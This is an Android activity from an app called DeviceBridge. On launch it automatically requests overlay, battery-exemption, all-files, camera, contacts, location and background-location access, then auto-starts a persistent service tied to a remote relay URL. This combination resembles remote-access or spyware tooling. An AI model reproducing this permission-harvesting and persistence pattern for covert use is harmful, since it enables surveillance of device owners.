package com.devicebridge;

import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import com.devicebridge.utils.PermissionHelper;

public class ControlPanelActivity extends AppCompatActivity {

    private static final int RC_PERMISSIONS = 1001;
    private static final int RC_BACKGROUND_LOCATION = 1002;
    private static final int RC_OVERLAY = 1003;
    private static final int RC_STORAGE = 1004;

    private EditText etRelayUrl;
    private EditText etDeviceId;
    private TextView tvStatus;
    private Button btnStart;
    private Button btnStop;
    private boolean permissionFlowDone = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_control_panel);

        etRelayUrl = findViewById(R.id.et_relay_url);
        etDeviceId = findViewById(R.id.et_device_id);
        tvStatus = findViewById(R.id.tv_status);
        btnStart = findViewById(R.id.btn_start);
        btnStop = findViewById(R.id.btn_stop);

        // Auto-fill defaults
        String savedRelay = com.devicebridge.utils.Config.getRelayUrl(this);
        if (savedRelay.isEmpty()) {
            savedRelay = getString(R.string.default_relay_url);
        }
        String deviceId = com.devicebridge.utils.Config.getOrCreateDeviceId(this);

        etRelayUrl.setText(savedRelay);
        etDeviceId.setText(deviceId);

        btnStart.setOnClickListener(v -> startBridgeService());
        btnStop.setOnClickListener(v -> stopBridgeService());
        findViewById(R.id.btn_permissions).setOnClickListener(v -> startPermissionFlow());
        findViewById(R.id.btn_notif_listener).setOnClickListener(v -> openNotificationListenerSettings());

        updateStatus();

        // Auto-start permission flow immediately
        startPermissionFlow();
    }

    /**
     * Runs the full permission flow in sequence:
     * 1. Overlay permission
     * 2. Battery optimization
     * 3. Storage (MANAGE_EXTERNAL_STORAGE on R+)
     * 4. Runtime permissions (camera, contacts, location, etc.)
     * 5. Background location (must be requested AFTER foreground location on Android 11+)
     * 6. Auto-start service when all granted
     */
    private void startPermissionFlow() {
        // Step 1: Overlay permission
        if (!Settings.canDrawOverlays(this)) {
            Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            startActivityForResult(i, RC_OVERLAY);
            return;
        }

        // Step 2: Battery optimization
        requestBatteryOptimization();

        // Step 3: Storage permission (Android 11+)
        if (PermissionHelper.needsManageStorage()
                && !PermissionHelper.isExternalStorageManager(this)) {
            Intent manage = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION,
                    Uri.parse("package:" + getPackageName()));
            try {
                startActivityForResult(manage, RC_STORAGE);
            } catch (Exception e) {
                startActivityForResult(
                        new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION), RC_STORAGE);
            }
            return;
        }

        // Step 4: Runtime permissions
        String[] perms = PermissionHelper.getRuntimePermissions();
        if (perms.length > 0) {
            ActivityCompat.requestPermissions(this, perms, RC_PERMISSIONS);
        } else {
            onRuntimePermissionsDone();
        }
    }

    private void requestBatteryOptimization() {
        try {
            String action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS;
            Intent intent = new Intent(action, Uri.parse("package:" + getPackageName()));
            if (getPackageManager().resolveActivity(intent, 0) != null) {
                startActivity(intent);
            }
        } catch (Exception ignored) {}
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == RC_PERMISSIONS) {
            onRuntimePermissionsDone();
        } else if (requestCode == RC_BACKGROUND_LOCATION) {
            // All done, auto-start
            permissionFlowDone = true;
            autoStartIfReady();
        }
    }

    private void onRuntimePermissionsDone() {
        // Step 5: Background location (must be separate on Android 11+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            ActivityCompat.requestPermissions(this,
                    new String[]{android.Manifest.permission.ACCESS_BACKGROUND_LOCATION},
                    RC_BACKGROUND_LOCATION);
        } else {
            permissionFlowDone = true;
            autoStartIfReady();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        // Continue permission flow after returning from settings screens
        if (requestCode == RC_OVERLAY || requestCode == RC_STORAGE) {
            startPermissionFlow();
        }
    }

    /**
     * Auto-start service if not already running and permission flow is done.
     */
    private void autoStartIfReady() {
        if (!BridgeService.isRunning()) {
            startBridgeService();
        }
        updateStatus();
    }

    private void startBridgeService() {
        String relayUrl = etRelayUrl.getText().toString().trim();
        String deviceId = etDeviceId.getText().toString().trim();

        if (relayUrl.isEmpty()) {
            relayUrl = getString(R.string.default_relay_url);
        }
        if (deviceId.isEmpty()) {
            deviceId = com.devicebridge.utils.Config.getOrCreateDeviceId(this);
        }

        com.devicebridge.utils.Config.saveConfig(this, relayUrl, deviceId);
        com.devicebridge.utils.Config.setAutoStart(this, true);

        Intent intent = new Intent(this, BridgeService.class);
        intent.putExtra("relayUrl", relayUrl);
        intent.putExtra("deviceId", deviceId);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }

        Toast.makeText(this, "Bridge service started", Toast.LENGTH_SHORT).show();
        updateStatus();
    }

    private void stopBridgeService() {
        stopService(new Intent(this, BridgeService.class));
        com.devicebridge.utils.Config.setAutoStart(this, false);
        Toast.makeText(this, "Bridge service stopped", Toast.LENGTH_SHORT).show();
        updateStatus();
    }

    private void openNotificationListenerSettings() {
        startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
    }

    private void updateStatus() {
        boolean running = BridgeService.isRunning();
        tvStatus.setText(running ? "Service: RUNNING ✓" : "Service: STOPPED");
        tvStatus.setTextColor(running ? 0xFF22C55E : 0xFFEF4444);
        btnStart.setEnabled(!running);
        btnStop.setEnabled(running);

        etRelayUrl.setEnabled(!running);
        etDeviceId.setEnabled(!running);
    }

    @Override
    protected void onResume() {
        super.onResume();
        updateStatus();
    }
}
